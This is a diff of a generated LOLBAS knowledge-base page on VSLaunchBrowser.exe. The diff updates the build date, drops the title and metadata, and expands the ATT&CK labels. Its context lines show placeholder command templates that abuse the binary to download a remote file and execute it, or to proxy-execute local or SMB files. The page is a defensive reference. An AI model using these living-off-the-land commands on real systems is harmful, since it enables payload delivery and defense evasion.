@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/VsLaunchBrowser.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VsLaunchBrowser.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "VSLaunchBrowser.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# VSLaunchBrowser.exe
-
 Microsoft Visual Studio browser launcher tool for web applications debugging
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2024-04-12
-- Author: Avihay Eldad
-- Source Path: yml/OtherMSBinaries/VsLaunchBrowser.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
 - Use Case: It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 2. Execute
 
@@ -63,7 +54,7 @@ VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
 - Use Case: It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127]]
+- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]]
 
 ### 3. Execute
 
@@ -76,7 +67,7 @@ VSLaunchBrowser.exe .exe {PATH_SMB}
 - Use Case: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
 - Privileges: User
 - Operating System: Windows
-- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127]]
+- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]]
 
 ## Detections
 
